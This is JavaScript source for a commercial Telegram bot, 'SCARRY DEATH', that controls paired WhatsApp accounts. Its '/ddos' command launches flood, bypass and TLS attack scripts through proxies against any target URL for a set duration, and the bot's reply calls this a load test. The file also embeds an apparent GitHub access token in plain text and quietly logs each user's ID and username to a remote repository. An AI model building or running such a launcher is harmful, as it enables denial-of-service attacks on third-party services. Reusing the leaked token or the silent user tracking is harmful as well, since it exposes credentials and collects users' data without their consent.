const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header
} = require('@whiskeysockets/baileys');

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const httpMod = require('http')
const httpsMod = require('https')
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const { GoogleGenerativeAI } = require("@google/generative-ai");
const ONLY_FILE = path.join(__dirname, "SINGGLE ERA", "GroupOnly.json");
const cd = path.join(__dirname, "SINGGLE ERA", "Cooldown.json");
const blacklistFile = path.join(__dirname, "SINGGLE ERA", "blacklist.json");
let blacklistedCommands = [];
let commandUsage = {};





// ==================( DATABASE + PW ) ==============
///----- ( DATABASE )---\\\
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Raraaimupp/databasescarrydrathh/refs/heads/main/tokens.json"
const CONTROL_URL = "https://raw.githubusercontent.com/Raraaimupp/scarrycontrol/refs/heads/main/controll.text";

let BOT_ACTIVE = true;
let SECURE_MODE = false;
const RPW = "RAA4YOU";
const verifiedUsers = new Set();
let isUnlocked = false;

async function fetchValidTokens() {
            try {
            const response = await axios.get(GITHUB_TOKEN_LIST_URL);
            return response.data.tokens; 
            } catch (error) {
            console.error(chalk.red("❌ Github Eror : Gagal mengambil daftar token dari GitHub:", error.message));
            return [];
            }
            }

   async function validateToken() {
   console.log(chalk.blue(`SABAR YAKK, TOKENYA LAGI DI CEK 🔍
`));
   
   const validTokens = await fetchValidTokens();
   if (!validTokens.includes(BOT_TOKEN)) {
   console.log(chalk.red(`
═══════════════════════════════════════════
⛔ TOKEN ANDA TIDAK TERDAFTAR DI DATABASE !!! ⛔
    BUY AKSEE PV TELEGRAM @raraa_imuppp
═══════════════════════════════════════════⠀`));
   process.exit(1);
   }
   console.log(chalk.green(` 
TOKEN TERDAFTAR, THANKS TO SUDAH MEMBELI SCRIPT INI⠀`));
  startBot();
  initializeWhatsAppConnections();
  }



function startBot() {
  console.log(chalk.green(`
⣿⣿⣿⣿⡿⣩⣾⣿⣿⣶⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⠟⣼⡿⢟⢸⣿⣿⣿⠿⢷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡏⣾⣿⡆⣾⣿⣸⣯⣿⡾⣿⢗⠿⣷⣝⣛⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣮⣭⣾⣿⡏⢿⣝⣯⣽⣶⣿⣿⣿⠿⣿⡇⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢫⣾⣿⢿⠟⣋⢿⣲⣿⡿⣟⣿⣦⣝⡻⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣮⢫⣾⣿⠀⠛⠁⣿⣿⣾⣿⣿⣿⣿⣯⣷⣪⣟⢿⣿
⣿⢿⢿⣿⣿⣿⢸⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⣝⡜⣿
⢃⡖⣼⣿⣿⣿⣏⣿⣿⣿⣿⣿⣧⡯⣽⣛⢿⠿⠿⢿⠿⠟⡛⣣⣿
⣷⣾⣾⣿⣿⡏⣝⢨⣟⡿⣿⣿⣿⣿⣮⣿⣫⡿⠿⣭⡚⣷⣴⣿⣿
⣿⠻⢿⢰⡬⣱⣝⣮⣿⣿⣿⣾⣭⣟⣻⡿⠿⠿⠿⣛⣵⣿⣿⣿⣿
⣛⠎⢟⡴⣿⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⣿⣬⣭⣭⣝⡻⢿⣿⣿⣿
⡜⣫⣿⣷⣿⣿⣼⣿⣿⣟⡿⣿⣿⣿⣿⣿⡟⠿⣿⡿⣿⣦⢻⣿⣿
⢅⣭⣿⣿⣿⣿⣼⣿⣿⣿⣽⣿⣿⣿⣿⡿⣹⣷⣝⣃⣭⣵⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
BOT : CONNECTED 
NAME SCRIPT : SCARRY DEATH
VERSION : 19 Genz 2
DEVELOPER : @raraa_imuppp
CHANNEL : @kepoluyee
`));
};
validateToken () 

const OWNER_CHAT_ID = '1886007660';
const userId = OWNER_CHAT_ID

// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363400362472743@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;

              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
ⓘ 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘕𝘰𝘮𝘰𝘳 ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;

      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`︎
ⓘ 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘕𝘰𝘮𝘰𝘳 ${botNumber}.....
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`
ⓘ 𝘎𝘢𝘨𝘢𝘭 𝘔𝘦𝘭𝘢𝘬𝘶𝘬𝘢𝘯 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘒𝘦 𝘕𝘰𝘮𝘰𝘳 ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`︎
ⓘ 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘒𝘦 𝘕𝘰𝘮𝘰𝘳 ${botNumber}..... 𝘚𝘶𝘤𝘤𝘦𝘴\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363400362472743@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));

      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await bot.editMessageText(
            `
\`\`\`︎ⓘ𝘚𝘶𝘬𝘴𝘦𝘴 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘢𝘪𝘳𝘪𝘯𝘨\`\`\`
𝘠𝘰𝘶𝘳 𝘊𝘰𝘥𝘦 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `\`\`\`
ⓘ𝘎𝘢𝘨𝘢𝘭 𝘔𝘦𝘭𝘢𝘬𝘶𝘬𝘢𝘯 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘒𝘦 𝘕𝘰𝘮𝘰𝘳 ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//-----( CASE ADD SENDER )-----\\
bot.onText(/\/addsender (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       const senderId = msg.from.id;
        if (!isOwner(senderId)) {
       return bot.sendMessage(
       chatId,
 `\`\`\`
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI
\`\`\``,
       { parse_mode: "Markdown" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in addbot:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
  
//-----( CASE DELET SENDER )-----\\
  bot.onText(/\/delsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
const senderId = msg.from.id;
        if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, `
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage( chatId ,  ` 
  \`\`\`
╭──────「 MENGHAPUS SENDER 」─────╮
│➻ Nᴜᴍʙᴇʀ :  ${botNumber}       
│➻ 𝚂𝚃𝙰𝚃𝚄𝚂 : Memproses.. 
╰──────────────────────────────╯\`\`\` `, 
    { parse_mode: "Markdown" }
  );

  try {
    const sheesh = sessions.get(botNumber);
    if (sheesh) {
      sheesh.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(` \`\`\`
╭──────「 SENDER DI HAPUS 」────────╮
│➻ Nᴜᴍʙᴇʀ :  ${botNumber}       
│➻ 𝚂𝚃𝙰𝚃𝚄𝚂 : Berhasil dihapus.. 
╰──────────────────────────────╯\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      await bot.editMessageText(` \`\`\`
╭──────「 EROR HAPUS SENDER 」──────╮
│➻ Nᴜᴍʙᴇʀ :  ${botNumber}       
│➻ 𝚂𝚃𝙰𝚃𝚄𝚂 : Sender tidak ditemukan
╰────────────────────────────────╯ \`\`\`   `,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(` \`\`\`
╭──────「 EROR HAPUS SENDER 」────────╮
│➻ Nᴜᴍʙᴇʀ :  ${botNumber}       
│➻ 𝚂𝚃𝙰𝚃𝚄𝚂 : ${error.message}
╰────────────────────────────────╯\`\`\``,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});
const { exec } = require("child_process")
bot.onText(/\/ddos(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, `HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }

  const argsText = match[1];
  const args = argsText ? argsText.split(' ') : []; 
  const cmd = args[0]; 

  switch (cmd) {
    case "flood": 
    case "bypass":
    case "tls": {
      const target = args[1]; 
      const time = args[2];   

      if (!target || !time) {
        return bot.sendMessage(chatId, `Contoh penggunaan:\n/ddos ${cmd} https://google.com 120`);
      }
      await bot.sendMessage(chatId, `🚀 Oke, memulai load test ke ${target} selama ${time} detik...`);

      exec(`node dd/${cmd} ${target} ${time} 100 10 ./dd/proxy.txt`, (error, stdout, stderr) => {
    
    if (error) {
        console.error(`exec error: ${error}`);
        bot.sendMessage(chatId, `Gagal menjalankan skrip:\n\`\`\`\n${stderr || error.message}\n\`\`\``);
        return;
    }

    if (stdout) {
        console.log(`stdout: ${stdout}`);
    }
    if (stderr) {
        console.warn(`stderr (warnings): ${stderr}`);
    }

    console.log(`Proses selesai dengan sukses.`);
    bot.sendMessage(chatId, `✅ Tes ke ${target} telah selesai.`);
});
      break;
    }

    default: {
      bot.sendMessage(chatId, `Perintah '${cmd}' tidak dikenali. Gunakan 'flood, tls, bypass'.`);
      break;
    }
  }
});
//-----( CASE LIST SENDER )-----\\
bot.onText(/\/listsender/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
const senderId = msg.from.id;
        if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, `
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
  if (!fs.existsSync(SESSIONS_DIR)) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada sender yang ditambahkan.\nGunakan /addsender ."
    );
  }
  const folders = fs.readdirSync(SESSIONS_DIR).filter((name) => {
    const fullPath = path.join(SESSIONS_DIR, name);
    return fs.statSync(fullPath).isDirectory();
  });
  if (folders.length === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada bot yang aktif.\nGunakan /addbot untuk menambahkan bot."
    );
  }
  let statusMessage = "╔══════════════════════╗\n";
  statusMessage += "║  LIST SENDER WHATSAPP    \n";
  statusMessage += "╠══════════════════════╣\n";

  folders.forEach((number, index) => {
    statusMessage += `║ ◈ Sender ${index + 1}\n`;
    statusMessage += `║ • Owner: ${number}\n`;
    statusMessage += "╠══════════════════════╣\n";
  });

  statusMessage += `║ Total sender : ${folders.length}\n`;
  statusMessage += "╚══════════════════════╝";

  await bot.sendMessage(chatId, `\`\`\`\n${statusMessage}\n\`\`\``, {
    parse_mode: "Markdown",
  });
});

//------( CASE GROUP ONLY )-----\\\
bot.onText(/^\/gruponly (on|of)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
        if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, `
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });
//-----( CASE COLDOWN )-----\\
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);
     const senderId = msg.from.id;
     
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
     }
     bot.sendMessage(chatId, response); });

const moment = require('moment');

///-----( CASE ADDPREM )-----\\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
Comand Salah  Contoh : /addprem 6843967527 30d.
`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
Comand Salah  Contoh :  /addprem 6843967527 30d.`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
Comand Salah  Contoh : /addprem 6843967527 30d.`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
Comand Salah  Contoh : /addprem 6843967527 30d.`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
    ✅ Succes add ${userId} to premium ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}..`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });
     
//-----( CASE DELET PREMIUM )-----\\
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
LU BUKAN OWNER TOLOLL`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
Command salah /delprem 6843967527 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
  🚫 Succes delete user ${userId} from premium.`);
         });     
         
//-----( CASE LIST PREMIUM )----\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
        if (!isOwner(senderId)) {
     return bot.sendMessage(chatId, `
`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
      message += "┃ ( + )  LIST PREMIUM USERS\n";
      message += "┣━━━━━━━━━━━━━━━━━━━━━━━┫\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `┃${index + 1}. ID: ${user.id}\n┃   Exp: ${expiresAt}\n`;
      });
      message += "┗━━━━━━━━━━━━━━━━━━━━━━━┛\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

//-----( CASE ADD ADMIN )-----\\
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`\`\`\`
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI
\`\`\``,
        { parse_mode: "Markdown" }
        );
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
Comand Salah  Contoh :  /addadmin 6843967527 30d.`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
Comand Salah  Contoh : /addadmin 6843967527 30d.`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
 ✅ Succes add ${userId} to admin`);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

///-----( CASE DELET ADMIN )-----\\\
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`\`\`\`
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI
\`\`\``,
        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
Comand Salah  Contoh : /deladmin 6843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
Comand Salah  Contoh : /deladmin 6843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
        🚫 Succes delete user ${userId} from Admin.`);
 } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
 }
});
//----- ( CASE LIST BLOCK ) -----\\
bot.onText(/\/listblock/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "🚫 Hanya Owner yang dapat melihat daftar blacklist!");
  }

  if (blacklistedCommands.length === 0) {
    return bot.sendMessage(chatId, "✅ Tidak ada command yang diblacklist saat ini.");
  }

  const list = blacklistedCommands.map((cmd, i) => `${i + 1}. ${cmd}`).join("\n");

  bot.sendMessage(
    chatId,
    `📋 *Daftar Command yang Diblock:*\n\n${list}`,
    { parse_mode: "Markdown" }
  );
});
///-----( CASE BLACKLIST )-----\\\
bot.onText(/\/block (\/\w+)/, (msg, match) => {
  const commandToBlacklist = match[1].toLowerCase();
  const chatId = msg.chat.id; 
  const senderId = msg.from.id;
  
     if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `🚫 Hanya Owner Yang dapat\nMengguakan Fitur ini !
      `
    );
  }
  
  
  if (!blacklistedCommands.includes(commandToBlacklist)) {
    blacklistedCommands.push(commandToBlacklist);
    saveBlacklist();
    bot.sendMessage(msg.chat.id, `✅ Command ${commandToBlacklist} berhasil diblacklist!`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ Command ${commandToBlacklist} sudah diblacklist.`);
  }
});
  
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // === KONFIGURASI ===
  const OWNER_ID = 1886007660;
  const NOTIF_TARGET_ID = -1003223539193;
  const GITHUB_FILE_URL = "https://raw.githubusercontent.com/Raraaimupp/controlscarrydeath/main/user.json";
  const GITHUB_TOKEN = "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"; // ganti dengan token GitHub kamu
  // ====================
const axios = require("axios");
const chalk = require("chalk");
    
  // === ANIMASI LOADING ===
  bot.sendMessage(chatId, "⚙️ *Memuat data bot...*", { parse_mode: "Markdown" }).then((loadingMsg) => {
    const steps = [
      "▰▱▱▱▱ 10%",
      "▰▰▱▱▱ 30%",
      "▰▰▰▱▱ 60%",
      "▰▰▰▰▱ 90%",
      "▰▰▰▰▰ 100%"
    ];

    let i = 0;
    const timer = setInterval(() => {
      if (i >= steps.length) {
        clearInterval(timer);
        bot.editMessageText("Gunakan Perintah Untuk Memulai /menu", {
          chat_id: chatId,
          message_id: loadingMsg.message_id,
          parse_mode: "Markdown"
        }).catch(() => {});
        processUser();
      } else {
        bot.editMessageText(`⚙️ *Memuat data bot...*\n${steps[i]}`, {
          chat_id: chatId,
          message_id: loadingMsg.message_id,
          parse_mode: "Markdown"
        }).catch(() => {});
        i++;
      }
    }, 700);
  });

  // === FUNCTION TANPA ASYNC / AWAIT ===
  function getUsersFromGitHub(callback) {
    axios
      .get(GITHUB_FILE_URL + "?t=" + Date.now())
      .then((res) => {
        let data = [];
        if (res && res.data) {
          if (Array.isArray(res.data)) data = res.data;
          else if (typeof res.data === "object" && res.data.users) data = res.data.users;
          else if (typeof res.data === "string" && res.data.trim().startsWith("[")) {
            try {
              data = JSON.parse(res.data);
            } catch {}
          }
        }
        callback(null, data);
      })
      .catch(() => callback(null, [])); // kalau error, kirim array kosong
  }

  function saveUsersToGitHub(users, callback) {
    const repoPath = GITHUB_FILE_URL.split("githubusercontent.com/")[1];
    const [usernameGit, repo, , ...filePath] = repoPath.split("/");
    const pathFile = filePath.join("/");
    const apiURL = `https://api.github.com/repos/${usernameGit}/${repo}/contents/${pathFile}`;
    const content = Buffer.from(JSON.stringify(users, null, 2)).toString("base64");

    axios
      .get(apiURL, { headers: { Authorization: `token ${GITHUB_TOKEN}` } })
      .then((res) => {
        const sha = res.data && res.data.sha ? res.data.sha : null;
        return axios.put(
          apiURL,
          { message: `Add user ${senderId}`, content, sha },
          { headers: { Authorization: `token ${GITHUB_TOKEN}` } }
        );
      })
      .catch(() => {
        // kalau file belum ada
        return axios.put(
          apiURL,
          { message: `Create user file`, content },
          { headers: { Authorization: `token ${GITHUB_TOKEN}` } }
        );
      })
      .then(() => callback(null))
      .catch((e) => {
        console.log(chalk.red("❌ Gagal update ke GitHub:"), e.message);
        callback(e);
      });
  }

  function processUser() {
    getUsersFromGitHub((_, users) => {
      if (!Array.isArray(users)) users = [];

      if (users.indexOf(senderId) === -1) {
        users.push(senderId);
        saveUsersToGitHub(users, (err2) => {
          if (err2) return console.log("⚠️ Error simpan user baru:", err2.message);

          const total = users.length;
          const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
          const notifText = `
\`\`\`👋🏻 User Baru Terdaftar!
━━━━━━━━━━━━━━━
🆔 User ID: ${senderId}
👤 Username: ${username}
📊 Total Pengguna: ${total}
🕒 Waktu: ${waktu}
🐚 Developer : @raraa_imuppp
━━━━━━━━━━━━━━━<\`\`\`
`;

          bot.sendMessage(NOTIF_TARGET_ID, notifText, { parse_mode: "Markdown" }).catch(() => {});
          bot.sendMessage(OWNER_ID, notifText, { parse_mode: "Markdown" }).catch(() => {});
          console.log(chalk.green(`✅ User ${senderId} disimpan & notifikasi dikirim.`));
        });
      } else {
        console.log("ℹ️ User sudah ada:", senderId);
      }
    });
  }
});

//----- ( CASE UNBLOCK )-----\\
bot.onText(/\/unblock (\/\w+)/, (msg, match) => {
  const commandToRemove = match[1].toLowerCase();
  const chatId = msg.chat.id; 
  const senderId = msg.from.id;
        if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `🚫 Hanya Owner Yang dapat Menghapus blacklist!!
      `
    );
  }
    
  blacklistedCommands = blacklistedCommands.filter(cmd => cmd !== commandToRemove);
  saveBlacklist();
  bot.sendMessage(msg.chat.id, `✅ Command ${commandToRemove} berhasil dihapus dari blacklist!`);
});

